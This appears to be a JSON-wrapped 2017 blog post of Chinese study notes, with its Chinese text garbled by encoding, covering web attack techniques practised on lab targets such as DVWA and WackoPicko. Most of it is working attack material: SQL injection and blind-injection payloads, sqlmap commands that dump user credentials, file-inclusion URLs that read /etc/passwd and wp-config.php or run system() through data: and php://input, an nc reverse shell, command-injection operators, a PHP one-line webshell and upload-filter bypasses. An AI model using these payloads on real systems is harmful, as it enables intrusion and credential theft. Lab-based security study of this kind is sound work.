    "url": "/posts/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B02/",
    "categories": "",
    "tags": "Security",
    "date": "2017-11-11 00:00:00 -0800",
    





    
    "snippet": "2 WebÊîªÂáªÊäÄÊúØ2.1 WebÊºèÊ¥ûÊ¶ÇËø∞  OWASP(Opwn Web Application Security Project)          owaspbwa        Ê≥®ÂÖ•  Â§±ÊïàÁöÑË∫´‰ªΩËÆ§ËØÅÂíå‰ºöËØùÁÆ°ÁêÜ          Padding Oracle‰ºöËØùÁÆ°ÁêÜÊºèÊ¥ûÁ†îÁ©∂‰∏ÄÊ≥¢                  ÂØπÁß∞Âä†ÂØÜ + CBC                      Ë∑®Á´ôËÑöÊú¨Ôºà...",
    "content": "2 WebÊîªÂáªÊäÄÊúØ2.1 WebÊºèÊ¥ûÊ¶ÇËø∞  OWASP(Opwn Web Application Security Project)          owaspbwa        Ê≥®ÂÖ•  Â§±ÊïàÁöÑË∫´‰ªΩËÆ§ËØÅÂíå‰ºöËØùÁÆ°ÁêÜ          Padding Oracle‰ºöËØùÁÆ°ÁêÜÊºèÊ¥ûÁ†îÁ©∂‰∏ÄÊ≥¢                  ÂØπÁß∞Âä†ÂØÜ + CBC                      Ë∑®Á´ôËÑöÊú¨ÔºàXSSÔºâ  Â§±ÊïàÁöÑËÆøÈóÆÊéßÂà∂  ÊïèÊÑü‰ø°ÊÅØÊ≥ÑÈú≤  ÊîªÂáªÊ£ÄÊµãÈò≤ËåÉÂíå‰∏çË∂≥  Ë∑®Á´ôËØ∑Ê±Ç‰º™ÈÄ†ÔºàCSFRÔºâ2.2 WebÊúçÂä°Âô®ÁöÑÊé¢Êµã  WAFÊé¢Êµãweb application firewall          nmapÁöÑwafÊé¢ÊµãËÑöÊú¨                  nmap -p 80 ‚Äìscript http-waf-detect.nse www.xxx.com                    wafw00f                  waf00f www.xxx.com                      WebÊúçÂä°Âô®Ë¥üËΩΩÂùáË°°Êé¢Êµã          CDNÔºàcontent distribution networkÔºâÂÜÖÂÆπÂàÜÂèëÁΩëÁ´ô      Cloudflare ‰∏ÄÂè∞ÊúçÂä°Âô®Êï∞ÊçÆ‰º†Âà∞CDNÂéÇÂïÜÁöÑÂêÑ‰∏™ËäÇÁÇπÔºåÁî®Êà∑ËÆøÈóÆÂêÑ‰∏™CloudflareËäÇÁÇπ      lbd www.xxx.com\tË¥üËΩΩÂùáË°°Êé¢Êµã        WebÈ°µÈù¢Áà¨Âèñ          Dirbuster ÁΩëÁ´ôÁõÆÂΩïÂíåÊñá‰ª∂ÁöÑÈÅçÂéÜÂíåÁåúËß£                  Â≠óÂÖ∏‰ΩçÁΩÆÔºö /usr/share/dirbuster/wordlists/                    httrackÁΩëÁ´ôÈïúÂÉè/ÂÖãÈöÜ      vbscan\t\tÊé¢ÊµãvBulletinÂèäÂÖ∂ÊºèÊ¥û      vane/wpscan Êé¢ÊµãWordpressÂèäÂÖ∂ÊºèÊ¥û      joomscan Êé¢ÊµãjoomlaÂèäÂÖ∂ÊºèÊ¥û      2.3 ÈíàÂØπWebËÑöÊú¨ÁöÑÊîªÂáª  SQLÊ≥®ÂÖ•ÊºèÊ¥ûÊîªÂáª          Bricks                  Á¨¨‰∏ÄÈ¢ò                          'or'1'='1              'or'1              Â¶ÇÊûú‰∏çËÉΩËæìÂÖ•ÂçïÂºïÂè∑                                  Áî®Êà∑ÂêçÔºö\\                  ÂØÜÁ†ÅÔºö or 1#                                                              Á¨¨‰∫åÈ¢òÔºàjsÊü•ÁúãÁΩëÈ°µÊ∫ê‰ª£Á†ÅÔºåjsÂ§ö‰∫Ü‰∏ÄÈÅìÊ£ÄÊµãËæìÂÖ•ÁâπÊÆäÂ≠óÁ¨¶ÁöÑÂáΩÊï∞ÔºåÈúÄË¶ÅÁªïËøáÔºâ                          function onSubmitOfLoginForm(‚Ä¶)              1.Ë¶ÜÁõñÂéüÂáΩÊï∞(Ê£ÄÊü•-console-ÂèØ‰ª•Ë¶ÜÁõñÂéüÂÖàÁöÑÂáΩÊï∞)                                  function onSubmitOfLoginForm (){ return true;}                                            2.ÂÆö‰πâÂáΩÊï∞Ê∞∏ËøúËøîÂõûtrue              3.ËæìÂÖ•‰∏áËÉΩÂØÜÁ†ÅÂç≥ÂèØ              4.Á¶ÅÁî®js‰∏≠ÁöÑÊâßË°å                                Á¨¨‰∏âÈ¢ò                          1')or('1=1              SELECT * FROM users WHERE name=('1')or('1=1') and password=('1')or('1=1') LIMIT 0,1                                Á¨¨ÂõõÈ¢ò                          ÂèåÂºïÂè∑                                Á¨¨‰∫îÈ¢ò                          'or'1'# or 'or'1'--               #Ê≥®Èáä‰πãÂêéÁöÑsqlËØ≠Âè•              ÂæÆËΩØÊï∞ÊçÆÂ∫ìÊ≥®ÈáäÁ¨¶ -- + Á©∫Ê†º              md5Êï£ÂàóÔºà128bit 16byte 32asciiÂ≠óÁ¨¶Ôºâ              sha1Ôºà160bit 20byte 40asciiÔºâ              sha256Ôºà256bit 32byte 64asciiÔºâ                                http://www.wechall.net/ È¢òÂ∫ì          Á¨¨ÂÖ≠È¢ò                          ÈáçÂÆöÂêë                                Á¨¨‰∏ÉÈ¢ò                          ÂÖàÂåπÈÖçÁî®Êà∑ÂêçÔºåÂú®Êü•ËØ¢ÊØîÂØπÂØÜÁ†Å              Áî®Êà∑ÂêçÔºö'and 0 union select md5('1'),md5('1'),md5('1'),md5('1'),md5('1'),md5('1'),md5('1'),md5('1')#              ÂØÜÁ†ÅÔºö1                                          mysqlÂ∏∏Áî®ËØ≠Âè•                  select version();          select database();          select user();          show databases;          use mysql;          show tables;          desc user;\t//ÊèèËø∞userË°®          select Host,User,Password from user;          select Host,User,Password from user where User=‚Äôroot‚Äô and 1;          select Host,User,Password from user where User=‚Äôroot‚Äô and 0 union select 1,2,3;   //ËÆ©Â∑¶ËæπËÆ∞ÂΩï‰∏∫Á©∫ÔºåÊéßÂà∂Âè≥ËæπÁöÑËøîÂõûÂÄº          select Host,User,Password from user where User=‚Äô‚Äô and 0 union select 1,2,md5(‚Äò1‚Äô);                          Áî®Êà∑Âêç‰∏ésqlËØ≠Âè•ÂêàÂπ∂ÔºåËÆ©ÂéüÊú¨sqlËØ≠Âè•‰∏∫0ÔºåÁî®selectËØ≠Âè•‰ΩøÊØè‰∏ÄÂàóÈÉΩÊòØmd5(‚Äò1‚Äô)ÁöÑÂÄºÔºåÁÑ∂ÂêéÂú®ÂØÜÁ†ÅËæìÂÖ•1ÔºåÂç≥ÂèØÂåπÈÖçÔºåÁôªÂΩïÊàêÂäü„ÄÇ              ÂÖàÂÅöandÂÜçÂÅöor              Â∫ìÂêçË°®ÂêçÂå∫ÂàÜÂ§ßÂ∞èÂÜôÔºåÂàóÂêç‰∏çÂå∫ÂàÜÂ§ßÂ∞èÂÜô                                            wordpressÈù∂Êú∫ÊºèÊ¥û          wpscan ‚Äìurl http://192.168.80.240/wordpress ‚Äì enumerate p      /vane/vane.rb ‚Äìurl http://192.168.80.240/wordpress ‚Äìenumerate p                  data/plugins.txt                    select * from xxx where ss_id=1 and 0 union select 1,version(),user(),database()#      %27-&gt;',%25-&gt;%,%5C-&gt;\\      È™åËØÅÊòØÂê¶Â≠òÂú®ÊºèÊ¥ûÔºöhttp://192.168.80.240/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1 and 1=2      ‰ΩøÁî®union selectËÅîÂêàÊèíÊü•ËØ¢Ôºöhttp://192.168.10.50/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1 and 0 union select 1,group_concat(TABLE_NAME),3,4 from information_schema.TABLES where TABLE_SCHEMA=0x776F72647072657373 group by TABLE_SCHEMA #      group_concat ÊääÁõ∏ÂêåÁöÑË°åÂΩíÂπ∂Âú®‰∏ÄËµ∑        msyqlÂéüË°®Ê≥®ÂÖ•Ëé∑Âèñ‰ø°ÊÅØÁöÑÊñπÊ≥ïÔºàÊó†Ê≥ïËé∑ÂæóË°®ÁöÑÂêçÂ≠óÁ≠âÁõ∏ÂÖ≥‰ø°ÊÅØÔºâ          ÂÅö‰∏Ä‰∏™ÊµãËØïÔºåÊñ∞Âª∫‰∏Ä‰∏™userË°®                  create schema Test;          use Test;          create table users (id INT, username, password);          insert into users values (1, ‚Äòadmin‚Äô);          select * from users;                    ÈÄöËøáuse information_schema;Ëé∑ÂæóÊï∞ÊçÆÂ∫ìÊâÄÊúâË°®Âêç                  tables ÂåÖÂê´ÊâÄÊúâË°®ÂêçÔºõ          columns ÂåÖÂê´ÊâÄÊúâÂ≠óÊÆµÂêç          select 1,2 from dual where 0 union select TABLE_SCHEMA,group_contat(TABLE_NAME) TABLE_NAME from information_schema, TABLES  where TABLE_SCHEMA=‚ÄôTest‚Äô LIMIT 1; //Ëé∑ÂèñTestÊï∞ÊçÆÂ∫ì‰∏≠ÁöÑÊâÄÊúâË°®Âêç          select databse(); //Ëé∑ÂèñÂΩìÂâçÊï∞ÊçÆÂ∫ìÂêçÂ≠ó          select Host,User,Passoword from user \\G;          hex(‚Äòwordpress‚Äô); //776F72647072657373          select 776F72647072657373;                    Âè™ÈÄÇÁî®‰∫émysqlÁöÑÊä•ÈîôÊ≥ï                  select * form user where 0 and extractvalue(1,version());          /*!00000 payload */          Ëé∑ÂèñÊñá‰ª∂ÂÜÖÂÆπÔºöhttp://192.168.80.240/wordpress/wp-content/plugins/wpSS/ss_handler.php?ss_id=1 and 1=0 union select 1,hex(load_file(‚Äò/var/www/wordpress/wp-config.php‚Äô)),3,4‚Äì                      Áõ≤Ê≥®sqlÊ≥®ÂÖ•ÊñπÊ≥ï          union select      error-based      time-based blind      ÁåúËß£Ê≥ï-&gt;‰∫åÂàÜÊäòÂçäÁåúËß£Ê≥ï(boolean-based blind)                  ÈúÄË¶ÅÂÖàÂà§Êñ≠ÂèòÈáèÈïøÂ∫¶len()          192.168.10.50/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1 +                          and ascii(substr((select user() from wp_users limit 0,1),1,1))&gt;128 //ÈÄöËøáÂà§Êñ≠ÁΩëÈ°µÊòØÂê¶ÂèòÂåñÁ°ÆÂÆöÁåúÊµãÊòØÂê¶Ê≠£Á°Æ              and ascii(substr((select user()),1,1))=119 //userÂèòÈáèÁ¨¨‰∏Ä‰∏™Â≠óÁ¨¶ÊòØw              ÊêúÁ¥¢user‰∏≠ÁöÑÁ¨¨‰∏Ä‰∏™Â≠óÁ¨¶asciiÂ∫îËØ•Âú®0-255‰πãÂâçÔºå‰∏Ä‰∏™‰∏Ä‰∏™Â∞ùËØï              ÊâæÂà∞ÂØπÂ∫îÊñπÊ≥ïÔºå‰ΩøÁî®ord(‚Äòa‚Äô)ÊàñËÄÖchr(111)              ÊñπÊ≥ï‰∫å:Â¶ÇÊûú‰∏çËÉΩÁõ¥Êé•Êü•ÁúãÁΩëÈ°µÂèòÂåñÔºåÂèØ‰ª•ÈÄöËøáÊòØÂê¶Ë∂ÖËøá5ÁßíÊù•Âà§Êñ≠ÊòØÂê¶Á¨¶ÂêàÊ†áÂáÜ                                  and if(ascii(substr((select user()),1,1))&gt;128,1,sleep(5))# //ifÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞ÊòØtrueÔºåÁõ¥Êé•ÊâßË°åÔºåËã•ÊòØfalseÔºåË∞ÉÁî®sleep                                            ÊñπÊ≥ï‰∏âÔºö‰ªéÈ°µÈù¢ËøîÂõûÊó∂Èó¥Âà§Êñ≠ÊòØÂê¶ÂÆåÊàê,benchmark()ÊÄßËÉΩÂà§Êñ≠ÂáΩÊï∞                                  and if(ascii(substr((select user()),1,1))&gt;118,1,benchmark(1000000,md5(0x20)))                                                                          sqlÊ≥®ÂÖ•Â∑•ÂÖ∑          Pangolin      Hacij      Safe3      ÂïäD      SQLmap                  sqlmap ‚Äìurl 192.168.10.50/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1 ‚Äìfingerprint  //Âà§Êñ≠Ëøô‰∏™urlÂèØ‰ª•Áî®Âì™‰∫õÊñπÂºèÂÆûÁé∞Ê≥®ÂÖ•                          $_GET[‚Äòid‚Äô]              $_POST[‚Äòid‚Äô]              $_COOKIE[‚Äòid‚Äô]              request.get              request.form              request.cookie              request                                sqlmap ‚Äìurl 192.168.10.50/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1 ‚Äìdbs //Ëé∑ÂèñÊï∞ÊçÆÂ∫ìÂàóË°®          sqlmap ‚Äìurl 192.168.10.50/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1 -D wordpress ‚Äìtables //Ëé∑ÂèñwordpressÂ∫ì‰∏≠ÊâÄÊúâË°®          sqlmap ‚Äìurl 192.168.10.50/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1 -D wordpress -T wp_users ‚Äìcolumn //Ëé∑ÂæóË°®‰∏≠ÁöÑÊâÄÊúâÂàó          sqlmap ‚Äìurl 192.168.10.50/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1 -D wordpress -T wp_users -C user_login,user_pass ‚Äìdump //Ëé∑ÂèñÂàó‰∏≠ÊåáÂÆöÊï∞ÊçÆÔºåÂØºÂá∫Êï∞ÊçÆ          ‚Äìcount //Ëé∑ÂèñÊï∞ÊçÆÊï∞Èáè          ‚Äìstart=1 ‚Äìstop=5 //Ëé∑ÂèñÈÉ®ÂàÜÁöÑÊï∞ÊçÆ          -tamper xxx.py //Ë£ÖËΩΩÊåáÂÆöpayload          sqlmap ‚Äìpurge-output\t\t//Ê∏ÖÈô§ÁºìÂ≠ò                          Êï∞ÊçÆÁºìÂ≠òÂú®/root/.sqlmap/output/                                          ÁªïËøáWAF                  %09(tabÈîÆ)‰ª£ÊõøÁ©∫Ê†º          %0aÔºàÊç¢Ë°åÔºâ%0d(ÂõûËΩ¶)‰ª£ÊõøÁ©∫Ê†º          ‰ΩøÁî®Êã¨Âè∑          ÂèØ‰ª•‰ΩøÁî®/*!00000user()*/Âú®Ê≥®Èáä‰∏≠ÂÆûÁé∞ËøêË°åËØ≠Âè•                            POSTÊñπÂºè          POST /login.php HTTP/1.1  host:xxx  User-agent:xxx  Accept:...  Content-type:...  Content-length: 30                           username=xxx&amp;password=123456          ‰ΩøÁî®ÁÅ´Áãêtemper dataÊèí‰ª∂          Ê≥®ÂÖ•Êó∂ÊòØËØ∑Ê±ÇÊï∞ÊçÆÂåÖÊäïÂêëÁöÑurlÂú∞ÂùÄ          sqlmap -u ‚Äúhttp://172.16.185.185/WackoPicko/users/login.php‚Äù ‚Äìdata=‚Äùusername=tt&amp;password=123456‚Äù -p username ‚Äìfingerprint          sqlmap -u ‚Äúhttp://172.16.185.185/WackoPicko/users/login.php‚Äù ‚Äìdata=‚Äùusername=tt&amp;password=123456‚Äù -p username ‚Äìdbs          sqlmap -u ‚Äúhttp://172.16.185.185/WackoPicko/users/login.php‚Äù ‚Äìdata=‚Äùusername=test&amp;password=123456‚Äù -p username -D wackopicko ‚Äìtables   \t* sqlmap -u ‚Äúhttp://172.16.185.185/WackoPicko/users/login.php‚Äù ‚Äìdata=‚Äùusername=test&amp;password=123456‚Äù -p username -D wackopicko -T users ‚Äìcolumns   \t* sqlmap -u ‚Äúhttp://172.16.185.185/WackoPicko/users/login.php‚Äù ‚Äìdata=‚Äùusername=test&amp;password=123456‚Äù -p username -D wackopicko -T users -C id,login,password ‚Äìdump                    ÂÆΩÂ≠óÁ¨¶ÁºñÁ†ÅÁªïËøá                  phpÁöÑaddslashÂáΩÊï∞‰ΩøÂæó'Âèò‰∏∫\\'ÔºåÂú®GBKÁºñÁ†Å‰∏≠ÔºåËã•Á¨¨‰∏Ä‰∏™Â≠óÁ¨¶Â§ß‰∫é%80ÂàôÈªòËÆ§‰∏∫ÂèåÂ≠óÁ¨¶Ôºå‰ΩøÁî®%81%27ÔºåÁî±‰∫éaddslash‰ΩøÂæóÂèò‰∏∫%81%5c%27ÔºåËÄå%81%5cÂàôÊàê‰∏∫‰∏Ä‰∏™Â≠óÁ¨¶Ôºå‰ªéËÄå‰ΩøÂæóÂçïÂºïÂè∑ÈÅøÂÖçË¢´ËΩ¨‰πâ          http://172.16.1.180/index.php?id=1          sqlmap ‰ΩøÁî®GETÊñπÊ≥ï                    2.4 Êñá‰ª∂ÂåÖÂê´ÊºèÊ¥ûÊîªÂáª  ÂÆö‰πâÔºöÊúçÂä°Âô®ÈÄöËøáËÑöÊú¨‰ª£Á†ÅÂú®ÂåÖÂê´Êñá‰ª∂ÁöÑÊó∂ÂÄôËøáÊª§‰∏ç‰∏•Ôºå‰ªéËÄåÊ≥®ÂÖ•‰∏ÄÊÆµÊîªÂáªËÄÖËÉΩÂ§üÊéßÂà∂ÁöÑ‰ª£Á†Å„ÄÇ          ‚ÄúÊú¨Âú∞Êñá‰ª∂ÂåÖÂê´ÊºèÊ¥û‚ÄùÔºå Âç≥Local File Inclusion, LFI„ÄÇ      Â¶ÇÊûúPHPÁöÑÈÖçÁΩÆÈÄâÈ°π‰∏∫‚Äúall_url_include‚ÄùÁöÑËØùÔºåÂàôinclude/requireÂáΩÊï∞ÂèØ‰ª•Âä†ËΩΩËøúÁ®ãÊñá‰ª∂ÔºåËøôÁßçÊºèÊ¥ûË¢´Áß∞‰∏∫‚ÄúËøúÁ®ãÊñá‰ª∂ÂåÖÂê´ÊºèÊ¥û‚ÄùÔºåÂç≥Remote File Inclusion, RFI„ÄÇ        Êú¨Âú∞Êñá‰ª∂ÂåÖÂê´ÊºèÊ¥û          wpscan      vane      http://172.16.1.227/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=/etc/passwd%00      http://172.16.1.227/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=php://filter/read=convert.base64-encode/resource=../../../../wp-config.php%00      Âú®FirefoxÊµèËßàÂô®‰∏≠ËÆæÁΩÆÊú¨Âú∞‰ª£ÁêÜÔºåÁî®ncÁõëÂê¨‰º†ÈÄíÁöÑÊï∞ÊçÆÂåÖ              ÊääÂæóÂà∞ÁöÑÂ≠óÁ¨¶‰∏≤‰ΩøÁî®HackBarÈÄöËøáBase64Ëß£Á†ÅPD9waHANCi8vICoqIE15U1FMIHNldHRpbmdzICoqIC8vDQpkZWZpbmUoJ0RCX05BTUUnLCAnd29yZHByZXNzJyk7ICAgIC8vIFRoZSBuYW1lIG9mIHRoZSBkYXRhYmFzZQ0KZGVmaW5lKCdEQl9VU0VSJywgJ3dvcmRwcmVzcycpOyAgICAgLy8gWW91ciBNeVNRTCB1c2VybmFtZQ0KZGVmaW5lKCdEQl9QQVNTV09SRCcsICd3b3JkcHJlc3MnKTsgLy8gLi4uYW5kIHBhc3N3b3JkDQpkZWZpbmUoJ0RCX0hPU1QnLCAnbG9jYWxob3N0Jyk7ICAgIC8vIDk5JSBjaGFuY2UgeW91IHdvbid0IG5lZWQgdG8gY2hhbmdlIHRoaXMgdmFsdWUNCg0KLy8gWW91IGNhbiBoYXZlIG11bHRpcGxlIGluc3RhbGxhdGlvbnMgaW4gb25lIGRhdGFiYXNlIGlmIHlvdSBnaXZlIGVhY2ggYSB1bmlxdWUgcHJlZml4DQokdGFibGVfcHJlZml4ICA9ICd3cF8nOyAgIC8vIE9ubHkgbnVtYmVycywgbGV0dGVycywgYW5kIHVuZGVyc2NvcmVzIHBsZWFzZSENCg0KLy8gQ2hhbmdlIHRoaXMgdG8gbG9jYWxpemUgV29yZFByZXNzLiAgQSBjb3JyZXNwb25kaW5nIE1PIGZpbGUgZm9yIHRoZQ0KLy8gY2hvc2VuIGxhbmd1YWdlIG11c3QgYmUgaW5zdGFsbGVkIHRvIHdwLWluY2x1ZGVzL2xhbmd1YWdlcy4NCi8vIEZvciBleGFtcGxlLCBpbnN0YWxsIGRlLm1vIHRvIHdwLWluY2x1ZGVzL2xhbmd1YWdlcyBhbmQgc2V0IFdQTEFORyB0byAnZGUnDQovLyB0byBlbmFibGUgR2VybWFuIGxhbmd1YWdlIHN1cHBvcnQuDQpkZWZpbmUgKCdXUExBTkcnLCAnJyk7DQoNCi8qIFRoYXQncyBhbGwsIHN0b3AgZWRpdGluZyEgSGFwcHkgYmxvZ2dpbmcuICovDQoNCmRlZmluZSgnQUJTUEFUSCcsIGRpcm5hbWUoX19GSUxFX18pLicvJyk7DQpyZXF1aXJlX29uY2UoQUJTUEFUSC4nd3Atc2V0dGluZ3MucGhwJyk7DQoNCmRlZmluZSgnUkVMT0NBVEUnLHRydWUpOw0KPz4=&lt;?php                  // ** MySQL settings ** //          define('DB_NAME', 'wordpress');    // The name of the database          define('DB_USER', 'wordpress');     // Your MySQL username          define('DB_PASSWORD', 'wordpress'); // ...and password          define('DB_HOST', 'localhost');    // 99% chance you won't need to change this value          // You can have multiple installations in one database if you give each a unique prefix           $table_prefix  = 'wp_';   // Only numbers, letters, and underscores please!          // Change this to localize WordPress.  A corresponding MO file for the\t          // chosen language must be installed to wp-includes/languages.          // For example, install de.mo to wp-includes/languages and set WPLANG to 'de'          // to enable German language support.          define ('WPLANG', '');          /* That's all, stop editing! Happy blogging. */          define('ABSPATH', dirname(__FILE__).'/');          require_once(ABSPATH.'wp-settings.php');          define('RELOCATE',true);          ?&gt;                    ËøúÁ®ãÊñá‰ª∂ÂåÖÂê´ÊºèÊ¥ûall_url_include()                  PHP‰∏≠ÂáΩÊï∞system\\passthru\\exec\\exec_onceÂèØ‰ª•ÂÆûÁé∞ÊâßË°åÁ≥ªÁªüÂëΩ‰ª§          http://172.16.1.227/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=php://input%00          Enable Post Data: &lt;?system(‚Äú/sbin/ifconfig‚Äù)?&gt;/&lt;?system(‚Äúuname -a‚Äù)?&gt;          ‰ΩøÁî®‰º™ÂçèËÆÆÁõ¥Êé•Áî®getÊñπÂºè:http://172.16.1.227/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=data:text/plain,&lt;?php system(‚Äúid‚Äù);?&gt;%00          ÊääphpÊåá‰ª§ÁªèËøábase64ÁºñÁ†ÅÂíåurlÁºñÁ†ÅÔºåÊõøÊç¢ÂéüÊù•ÁöÑ          http://172.16.1.227/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=data:text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9wYXNzd2QnKTs%2fPg%3D%3D%00                    2.5 ÂëΩ‰ª§Ê≥®ÂÖ•ÊºèÊ¥ûÊîªÂáª(Remote Command Execution, RCE)  ÊúçÂä°Âô®ÈÄöËøáËÑöÊú¨‰ª£Á†ÅÂú® ÊâßË°åÂëΩ‰ª§ÁöÑÊó∂ÂÄôËøáÊª§‰∏ç‰∏•Ôºå‰ªéËÄåÊ≥®ÂÖ•‰∏ÄÊÆµÊîªÂáªËÄÖËÉΩÂ§ü ÊéßÂà∂ÁöÑ‰ª£Á†ÅÔºå‰ªéËÄåÂú®ÊúçÂä°Âô®‰∏ä‰ª•WebÊúçÂä°ÁöÑÂêéÂè∞ÊùÉÈôê ËøúÁ®ãÊâßË°åÊÅ∂ÊÑèÊåá‰ª§„ÄÇ  nslookup Âä†ÂàÜÂè∑ÂÜçÂä†Âà´ÁöÑÂëΩ‰ª§ÂèØ‰ª•Ëé∑Âèñlinux‰ø°ÊÅØ„ÄÇ          ‰∏ÄËà¨ÂèØ‰ª•ÂÆûÁé∞ËØªÂÜôÁöÑÊñá‰ª∂                  /tmp          /sbin/ifconfig          /etc/passwd          /var/www                      ncÁõëÂê¨ÔºåËøûÊé•ÂèçÂºπshell          nc 172.16.185.167 -nlp 443      nc 172.16.185.167 443 -e /bin/sh      dirtycowÊèêÊùÉ        dvwa          user/user      Ê∫êÁ†Å‰ΩçÁΩÆÔºö /var/www/dvwa/vulnerabilities/exec/source/      `shell_command` ÊâßË°åshell_commandÂëΩ‰ª§      $(shell_command) ÊâßË°åshell_commandÂëΩ‰ª§      | shell_command ÊâßË°åshell_commandÂëΩ‰ª§Âπ∂ËøîÂõûÁªìÊûú      || shell_command ÊâßË°åshell_commandÂëΩ‰ª§Âπ∂ËøîÂõûÁªìÊûú      ; shell_command ÊâßË°åshell_commandÂëΩ‰ª§Âπ∂ËøîÂõûÁªìÊûú      &amp;&amp; shell_command ÊâßË°åshell_commandÂëΩ‰ª§Âπ∂ËøîÂõûÁªìÊûú      &gt; target_file ËøîÂõûÁªìÊûúË¶ÜÁõñÂà∞target_fileÈáå      &gt;&gt; target_file ËøîÂõûÁªìÊûúËøΩÂä†Âà∞target_fileÈáå      &lt; target_file Êäätarget_fileÁöÑÂÜÖÂÆπËæìÂÖ•Âà∞‰πãÂâçÁöÑÂëΩ‰ª§ÂΩì‰∏≠                        operator ÁªôÁõÆÊ†áÊåá‰ª§Ê∑ªÂä†È¢ùÂ§ñÁöÑÂèÇÊï∞                    2.6 Êñá‰ª∂‰∏ä‰º†ÊºèÊ¥ûÊîªÂáª  Webshell          Â§ßÈ©¨/Â∞èÈ©¨      ÊùÉÈôêÈóÆÈ¢òÂíåÂäüËÉΩÈóÆÈ¢ò      kaliÔºöweevely        Â∞èÈ©¨          CKnife      ËöÅÂª∫      altman        CKnife          ctrl+l Êñá‰ª∂ÁÆ°ÁêÜÂô®ËæìÂÖ•Âú∞ÂùÄ      Ëß£ÂéãckinfeÔºåÂà∞Ë∑ØÂæÑ‰∏ãÔºå      java -jar Cknife.jarËøêË°åckinfe      @eval(_$POST('cmd'));‰∏ÄÂè•ËØùÊú®È©¨      hackbar‰∏≠postdata‰∏≠ËæìÂÖ•cmd= echo hello;      Á¨¨‰∏ÄÈ¢ò                  ‰∏ä‰º†Êñá‰ª∂ËøáÁ®ã‰∏≠ÔºåÂΩìÈúÄË¶ÅÊ£ÄÈ™åÊñá‰ª∂Ê†ºÂºèÊó∂ÔºåËã•ÊòØÂâçÁ´ØÊ£ÄÈ™åÔºåÂèØ‰ª•‰øÆÊîπÂÆ°Êü•ÂÖÉÁ¥†          ËøòÂèØ‰ª•‰øÆÊîπÊñá‰ª∂Ê†ºÂºèÔºå‰ΩøÁî®burpsuiteÊäìÂåÖÔºåÂú®ÊµèËßàÂô®‰∏≠‰ΩøÁî®Êú¨Âú∞‰ª£ÁêÜÔºå‰øÆÊîπÂåÖÁöÑÂÜÖÂÆπÔºåÊîπÊñá‰ª∂Âêç          ‰πãÂêé‰ΩøÁî®CkinfeËé∑ÂèñÊúçÂä°Âô®ÁªìÊûÑ                    Á¨¨‰∫åÈ¢ò(MIMEÁ±ªÂûãÈ™åËØÅ)                  Âú®burpsuiteÈáå‰øÆÊîπÊñá‰ª∂Á±ªÂûã‰∏∫image/jpeg,ÁÑ∂ÂêéÂ∞±ËÉΩÈÅøÂºÄÊ£ÄÈ™å          image/jpeg                    Á¨¨‰∏âÈ¢òÔºàÊñá‰ª∂Êâ©Â±ïÂêçÁöÑÈªëÂêçÂçïÈ™åËØÅÔºâ                  strchrÊâæÁ¨¨‰∏Ä‰∏™Á¨¶ÂêàÊù°‰ª∂          strrchrÊâæÊúÄÂêé‰∏Ä‰∏™Á¨¶ÂêàÊù°‰ª∂          ‰øÆÊîπÂèØ‰ª•‰∏ä‰º†Êñá‰ª∂ÁöÑÂêéÁºÄ‰∏∫php3Ôºåphp4Ôºåphp5                    Á¨¨ÂõõÈ¢ò Êñá‰ª∂ÂÜÖÂÆπÊ†ºÂºèÈ™åËØÅ                  getimagesize($file_name);ÈÄöËøáÊñá‰ª∂Â§¥ÈÉ®Ëé∑ÂæóÊñá‰ª∂Â§ßÂ∞è          Âú®Êú®È©¨‰∏≠Âä†ÂÖ•GIF89aÂç≥ÂèØÁªïËøáÊ£ÄÊµãÔºåË¢´ÊúçÂä°Âô®Âà§Êñ≠ÊòØgifÊñá‰ª∂          ÊÄªÁªìÔºöÊîπÊàêÂêàÊ≥ïÁ±ªÂûã„ÄÅÊîπÊàêphp3„ÄÅÊîπÊàêÂêàÊ≥ïÁöÑÊñá‰ª∂Â§¥                    Á¨¨‰∫îÈ¢ò Êñá‰ª∂ÊãìÂ±ïÂêçÁôΩÂêçÂçïÈ™åËØÅ‚ÄìÂ≠êÁõÆÂΩïÂä´ÊåÅ                  ÁØ°ÊîπÂ≠êÁõÆÂΩïupload/yyy.php%00/xxx.jpg\t \t* Âú®burpsuite‰∏≠‰øÆÊîπimageÊîπÊàêtiny.phpÔºåÂÜçÊääproxy-hex‰∏≠ÊâæÂà∞Âπ∂Êääphp‰πãÂêéÁöÑ‰∏Ä‰∏™Â≠óËäÇÊîπ‰∏∫00„ÄÇ                            Êñá‰ª∂‰∏ä‰º†ÊºèÊ¥ûÊîªÂáª                    ÊèêÊùÉÂ§ßÊùÄÂô®Â∑•ÂÖ∑Ôºå‰ª§ÁâåÊî´ÂèñÊºèÊ¥û pr                  Á•ûÂô®ÔºöÁÜüÁªÉÊéåÊè°sqlmap,nmap,burpsuite,metaspolit,setoolkit                    2.7 Êñá‰ª∂‰∏ä‰º†ÊºèÊ¥û‰∏ä‰º†Êñá‰ª∂ÊîªÂáªÔºöIIS6.0Ëß£ÊûêASPÊºèÊ¥û  ÊúçÂä°Âô®‰∏äÂèØÊâßË°åÊñá‰ª∂Âêç‰∏∫.cer.cdx.asc  cerËØÅ‰π¶ÊúÄÂêéÂä†‰∏äÂ∞èÈ©¨@eval(_$POST('cmd'));ÂÆûÁé∞„ÄÇ  Âú®Êñá‰ª∂Â§πÂêç‰∏∫xxx.aspÁõÆÂΩï‰∏ãÔºåÈáåÈù¢ÂèØ‰ª•ÂÆûÁé∞‰ªªÊÑèÊãìÂ±ïÂêçÁöÑÊñá‰ª∂ÈÉΩ‰ºöÂú®ÊúçÂä°Âô®‰∏äÊâßË°å„ÄÇ  